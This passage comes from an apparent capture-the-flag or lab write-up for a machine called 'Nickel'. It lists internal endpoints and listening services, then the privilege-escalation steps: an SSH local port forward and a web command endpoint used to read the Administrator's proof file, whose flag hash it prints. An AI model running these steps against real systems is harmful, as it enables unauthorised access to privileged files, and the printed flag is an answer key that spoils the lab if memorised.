   Temporary Command endpoint: http://nickel/?
   Backup system: http://nickel-backup/backup
   NAS: http://corp-nas/files

2.   TCP        127.0.0.1             80            0.0.0.0               0               Listening         4               System                                                                     
  TCP        127.0.0.1             14147         0.0.0.0               0               Listening         1904            FileZilla Server  

```

**Privilege Escalation**

1. PE Steps

```
1. Created port forward from Kali machine to Nickel via SSH -L port forward.
   
   ssh -L 8000:127.0.0.1:80 ariah@192.168.162.99
   
2. Navigated to 127.0.0.1/? and tried to run a command given the found PDF data "
  Temporary Command endpoint: http://nickel/?" 
  
3. http://127.0.0.1:8000/?cat%20C:\Users\Administrator\Desktop\proof.txt
   
   675cbfba5959040e8880cb6c785f761a
   
```

2. Notes

```

```

